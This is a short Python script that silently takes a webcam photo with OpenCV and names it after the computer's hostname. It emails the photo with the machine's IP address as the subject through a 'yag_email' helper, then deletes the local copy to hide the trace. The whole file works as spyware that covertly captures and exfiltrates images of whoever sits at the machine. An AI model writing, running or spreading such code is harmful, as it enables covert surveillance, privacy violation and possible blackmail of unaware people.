from os import remove
import cv2
import yag_email
from socket import gethostbyname, gethostname
import time

name = gethostname()
ip = gethostbyname(name)


def send():
    cap = cv2.VideoCapture(0)
    f, frame = cap.read()
    cv2.imwrite(r'C:\Users\TZK\Desktop\学习\xvideos\{}.png'.format(name), frame)
    cap.release()
    time.sleep(1)
    yag_email.send_email('{}'.format(
        ip), r'C:\Users\TZK\Desktop\学习\xvideos\{}.png'.format(name))
    remove(r'C:\Users\TZK\Desktop\学习\xvideos\{}.png'.format(name))
